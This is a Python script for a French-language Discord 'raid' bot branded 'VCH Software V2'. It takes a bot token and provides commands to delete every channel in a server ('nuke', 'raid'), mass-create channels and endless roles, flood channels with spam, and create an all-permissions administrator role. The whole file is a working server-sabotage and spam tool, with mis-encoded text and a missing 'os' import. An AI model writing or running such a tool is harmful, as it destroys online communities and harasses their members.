import time
import discord
from discord.ext.commands import *
from discord.ext import commands
from discord import Permissions
from colorama import Back, Fore, Style, deinit, init
import requests







def Rtool(discord):
    global TOKEN
    global PREFIX
    TOKEN = input("Veuillez envoyer le token de votre bot [-->] ")
    PREFIX = input("Veuillez envoyer le prefixe de votre bot [-->] ")
    from colorama import Back, Fore, Style, deinit, init
    
    init()
    print("""
    """)
    import datetime
    now = datetime.datetime.now()
    print("""
    """)
    
    
     
    
    banner = """
    VCH Software V2                           
    _____________________________________________________________________
    """
    print("====<< Bienvenue >>====")
    print(banner)
    
    
    
    
    bot = commands.Bot(command_prefix=PREFIX)
    bot.remove_command('help')
    
    
    from colorama import Back, Fore, Style, deinit, init
    
    init()
    
    print(Fore.CYAN + Style.NORMAL + '...')
    deinit()
    import pandas as pd
    import numpy as np
    from tqdm import tqdm
    
    df = pd.DataFrame(np.random.randint(0, 10, (45000, 100)))
    
    tqdm.pandas(desc='Chargement en cours')
    df.progress_apply(lambda x: (x+3)**10) #3
    print("...")
    
    
    
    
    help_msg = ('''
    ===========<< SEN / VCH >>===========
    
     raid {nom_salons} = Creer pleins de salons 
     nuke = Supprime tout les salons
     role {nom} = CrÃƒÂ©er pleins de role
     spam {nombre} {message} = Spam un salon
     spamall {nombre} {message} = Spam tout les salons
     create {name} = CrÃƒÂ©er un role administrateur
     add {@member} {@role} = Ajoute un rÃƒÂ´le Ãƒ  une personne (Si le bot a les permissions)                         
    
    ===========<< https://discord.gg/PsSv2rZrF5 >>===========
     ''')
    embedVar = discord.Embed(title="VCH SoftWare V2", color=0x040479)
    embedVar.add_field(name="VCH V2", value=help_msg, inline=True)
    
    
    
    init()
    print(Fore.BLUE + Style.NORMAL + '...')
    
    
    deinit()
    
    
    
    
    
    
    @bot.command(pass_context=True)
    async def spam(ctx, num, message): 
    	num2 = int(num)
    	await ctx.message.delete()
    	print(Fore.MAGENTA + Style.NORMAL + f"[Console]:  Spam de l'argument: {message}, {num2} fois..")
    	for i in range(num2):
    		await ctx.send(message)
     
    @bot.command(pass_context=True)
    async def role(ctx, name):
        role_place = True
        await ctx.message.delete()
        i = 0
        print(Fore.MAGENTA + Style.NORMAL +"[Console]:  Creation des roles en cours..")
        while role_place == True:
            i += 1
            await ctx.guild.create_role(name=name)
        print(Fore.CYAN + Style.NORMAL + f"[Console]:  Nombre de roles crees, {i}")
            
    
    @bot.command(pass_context=True)
    async def raid(ctx, NAMEI):
        await ctx.message.delete()
        i = 0
        print(Fore.MAGENTA + Style.NORMAL +"[Console]:  Suppression des salons en cours..")
        for c in ctx.guild.channels:
        	i = i + 1
        	await c.delete()
        print(Fore.CYAN + Style.NORMAL + f"[Console]:  Nombre de salons supprimes: {i}")	
        print(Fore.MAGENTA + Style.NORMAL + f"[Console]:  Creation des salons avec le nom {NAMEI} en cours..")
        
        for i in range(500):
        	guild = ctx.message.guild
        	await guild.create_text_channel(NAMEI)
        print(Fore.CYAN + Style.NORMAL + f"[Console]: Nombre de salons crees, {i}")
        
    @bot.command(pass_context=True)
    async def nuke(ctx):
        await ctx.message.delete()
        i = 0
        print(Fore.MAGENTA + Style.NORMAL + f"[Console]:  Supression des salons en cours..")
        for c in ctx.guild.channels:
        	i = i + 1
        	await c.delete()
         
        await ctx.guild.create_text_channel("nuked")
        print(Fore.CYAN + Style.NORMAL + f"[Console]:  Nombre de salons supprimes: {i}")
    
    
    
    @bot.command(pass_context=True)
    async def create(ctx, name):
        await ctx.message.delete()
        await ctx.guild.create_role(name=name, mentionable=True, permissions=Permissions.all())
    
    @bot.command(pass_context=True) 
    async def add(ctx, user: discord.Member, role: discord.Role):
        await ctx.message.delete()
        await user.add_roles(role)
    
    @bot.command(pass_context=True)
    async def spamall(ctx, num, *, message):
        await ctx.message.delete()
        num = int(num)
        for a in range(num):
            for channel in ctx.guild.channels:
                await channel.send(message)
    
    
    @bot.command(pass_context=True)
    async def help(ctx):
    	print("[Console]:  Commande d'aide envoyee")
    	await ctx.message.delete()
    	await ctx.send(embed=embedVar)
    
    
    os.system("cls")
    print("Connexion au token en cours..")
    print("[                    ] 0% ")
    time.sleep(0.2)
    print("[=====               ] 25%")
    time.sleep(0.2)
    print("[==========          ] 50%")
    time.sleep(0.2)
    print("[===============     ] 75%")
    
    
    @bot.event
    async def on_ready():
        print("[====================] 100%")
        print("[Console]:  Connexion etablie avec succÃƒÂ¨s.")
        time.sleep(2)
        os.system("cls")
        print(Fore.RED + Style.NORMAL + 'Le logiciel est utilisable.')
        print()
        print()
        print("Les commandes:")
        print()
        print(help_msg)
        print()
        print(Fore.BLUE + Style.NORMAL + '[!] Logs')
        
    bot.run(TOKEN)



    

        
Rtool(discord)
    


